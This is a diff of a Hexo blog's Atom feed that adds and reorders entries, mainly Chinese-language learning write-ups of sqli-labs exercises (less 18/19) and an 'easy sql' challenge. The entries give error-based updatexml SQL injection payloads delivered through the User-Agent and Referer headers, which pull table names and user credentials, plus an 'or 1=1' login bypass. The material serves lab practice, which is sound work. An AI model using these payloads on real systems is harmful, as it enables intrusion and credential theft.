@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2022-02-23T10:02:45.285Z</updated>
+  <updated>2022-02-23T12:28:20.561Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,26 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>less18 and less19</title>
+    <link href="http://example.com/2022/02/23/18/"/>
+    <id>http://example.com/2022/02/23/18/</id>
+    <published>2022-02-23T12:09:45.000Z</published>
+    <updated>2022-02-23T12:28:20.561Z</updated>
+    
+    <content type="html"><![CDATA[<p><img src="https://s2.loli.net/2022/02/23/dfUAW1hJIDjqCaS.png" alt="1"><br>通过此题题目可知在正确登入账户后回回显ip地址及User Agent ，<br>并且通过源码可知在登入后将useragent和IP的数据插入的数据库中，但其账号密码都经过过滤，所以联系到通过利用user agent爆破。使用burp suip进行抓包来改变user agent内容来进行爆破<br><img src="https://s2.loli.net/2022/02/23/2a7IXPErgB83AlY.png" alt="2"><br><img src="https://s2.loli.net/2022/02/23/y6IsJKSBbV3nkNQ.png" alt="3"></p><pre><code>&#39; or updatexml(1,concat(&#39;~&#39;,(database()),&#39;~&#39;),1) and &#39;1&#39;=&#39;1</code></pre><p><img src="https://s2.loli.net/2022/02/23/G7O3pqFtfnHLS2r.png" alt="4"></p><pre><code>&#39;or updatexml(1,concat(&#39;~&#39;,substr((select group_concat(table_name) from information_schema.tables where table_scheam=&#39;security&#39;),1,31),&#39;~&#39;),1) and &#39;1&#39;=&#39;1</code></pre><p><img src="https://s2.loli.net/2022/02/23/ik7n9OwENRbAFo8.png" alt="5"></p><pre><code>&#39; or updatexml(1,concat(&#39;~&#39;,substr((select group_concat(column_name)from information_schema.columns where table_name=&#39;security&#39;),1,31),&#39;~&#39;),1) and &#39;1&#39;=&#39;1</code></pre><p><img src="https://s2.loli.net/2022/02/23/ad2v1iy5ZhsEfqx.png" alt="6"></p><pre><code>&#39; or updatexml(1,concat(0x7e,substr((select*from(select group_concat(id,&#39;~&#39;,username,&#39;~&#39;,password)from security.users)a),1,31),0x7e),1) and &#39;1&#39;=&#39;1</code></pre><p><img src="https://s2.loli.net/2022/02/23/eAy4gL73qTzIonf.png" alt="7"></p><p>less 19的话进去发现登入回显的为refer,所以与less18的做法相同，更改refer即可<br><img src="https://s2.loli.net/2022/02/23/cmld2pajVHZorUh.png" alt="8"><br><img src="https://s2.loli.net/2022/02/23/9THDpnPqL2Cwt5d.png" alt="9"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://s2.loli.net/2022/02/23/dfUAW1hJIDjqCaS.png&quot; alt=&quot;1&quot;&gt;&lt;br&gt;通过此题题目可知在正确登入账户后回回显ip地址及User Agent ，&lt;br&gt;并且通过源码可知在登入后将useragent和</summary>
+      
+    
+    
+    
+    
+  </entry>
   
   <entry>
     <title>less 17</title>
@@ -231,6 +251,19 @@ f</summary>
   </entry>
   
   <entry>
+    <title>My New Post</title>
+    <link href="http://example.com/1970/01/01/My-New-Post/"/>
+    <id>http://example.com/1970/01/01/My-New-Post/</id>
+    <published>1970-01-01T00:00:02.021Z</published>
+    <updated>2021-10-09T01:50:45.158Z</updated>
+    
+    
+    
+    
+    
+  </entry>
+  
+  <entry>
     <title>less 8</title>
     <link href="http://example.com/1970/01/01/less8/"/>
     <id>http://example.com/1970/01/01/less8/</id>
@@ -251,12 +284,19 @@ f</summary>
   </entry>
   
   <entry>
-    <title>My New Post</title>
-    <link href="http://example.com/1970/01/01/My-New-Post/"/>
-    <id>http://example.com/1970/01/01/My-New-Post/</id>
+    <title>极客easy sql</title>
+    <link href="http://example.com/1970/01/01/%E6%9E%81%E5%AE%A2easy%20sql/"/>
+    <id>http://example.com/1970/01/01/%E6%9E%81%E5%AE%A2easy%20sql/</id>
     <published>1970-01-01T00:00:02.021Z</published>
-    <updated>2021-10-09T01:50:45.158Z</updated>
+    <updated>2021-11-16T13:23:47.050Z</updated>
     
+    <content type="html"><![CDATA[<p>还是先尝试闭合方式， 输入1、1’、1” 判断，当输入 1’ 报错，结果语句应该为单引号闭合。<br><img src="https://i.loli.net/2021/11/16/jpu3h2tWK6fXF5a.png" alt="1.png"><br>此时就可以尝试利用联合查询进行注入<br>在用户名输入：1’ select 1,2,3–+密码输入：1<br><img src="https://i.loli.net/2021/11/16/WNsIKhPFoj2DHBY.png" alt="2.png"><br>此时会跳出<br><img src="https://i.loli.net/2021/11/16/3YL2fPJ5e7QM9Sc.png" alt="3.png"><br>说明密码1没有闭合，此时在1前再加’；<br>此时再登录会显示注入成功并没有任何过滤<br><img src="https://i.loli.net/2021/11/16/vUNOKVDQFMl1wp6.png" alt="4.png"><br>或者也可使用万能账号进行注入<br>输入1’or 1=1–+密码：’1<br><img src="https://i.loli.net/2021/11/16/RjQCxO9EALYcUuX.png" alt="5.png"><br>此时由于or后方条件恒为真，账号认定为真<br><img src="https://i.loli.net/2021/11/16/vUNOKVDQFMl1wp6.png" alt="6.png"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;还是先尝试闭合方式， 输入1、1’、1” 判断，当输入 1’ 报错，结果语句应该为单引号闭合。&lt;br&gt;&lt;img src=&quot;https://i.loli.net/2021/11/16/jpu3h2tWK6fXF5a.png&quot; alt=&quot;1.png&quot;&gt;&lt;br&gt;此时就可以尝试利用</summary>
+      
     
     
     
@@ -282,26 +322,6 @@ f</summary>
     
     
     <category term="学习进度出奇的慢" scheme="http://example.com/tags/%E5%AD%A6%E4%B9%A0%E8%BF%9B%E5%BA%A6%E5%87%BA%E5%A5%87%E7%9A%84%E6%85%A2/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>极客easy sql</title>
-    <link href="http://example.com/1970/01/01/%E6%9E%81%E5%AE%A2easy%20sql/"/>
-    <id>http://example.com/1970/01/01/%E6%9E%81%E5%AE%A2easy%20sql/</id>
-    <published>1970-01-01T00:00:02.021Z</published>
-    <updated>2021-11-16T13:23:47.050Z</updated>
-    
-    <content type="html"><![CDATA[<p>还是先尝试闭合方式， 输入1、1’、1” 判断，当输入 1’ 报错，结果语句应该为单引号闭合。<br><img src="https://i.loli.net/2021/11/16/jpu3h2tWK6fXF5a.png" alt="1.png"><br>此时就可以尝试利用联合查询进行注入<br>在用户名输入：1’ select 1,2,3–+密码输入：1<br><img src="https://i.loli.net/2021/11/16/WNsIKhPFoj2DHBY.png" alt="2.png"><br>此时会跳出<br><img src="https://i.loli.net/2021/11/16/3YL2fPJ5e7QM9Sc.png" alt="3.png"><br>说明密码1没有闭合，此时在1前再加’；<br>此时再登录会显示注入成功并没有任何过滤<br><img src="https://i.loli.net/2021/11/16/vUNOKVDQFMl1wp6.png" alt="4.png"><br>或者也可使用万能账号进行注入<br>输入1’or 1=1–+密码：’1<br><img src="https://i.loli.net/2021/11/16/RjQCxO9EALYcUuX.png" alt="5.png"><br>此时由于or后方条件恒为真，账号认定为真<br><img src="https://i.loli.net/2021/11/16/vUNOKVDQFMl1wp6.png" alt="6.png"></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;还是先尝试闭合方式， 输入1、1’、1” 判断，当输入 1’ 报错，结果语句应该为单引号闭合。&lt;br&gt;&lt;img src=&quot;https://i.loli.net/2021/11/16/jpu3h2tWK6fXF5a.png&quot; alt=&quot;1.png&quot;&gt;&lt;br&gt;此时就可以尝试利用</summary>
-      
-    
-    
-    
     
   </entry>
   
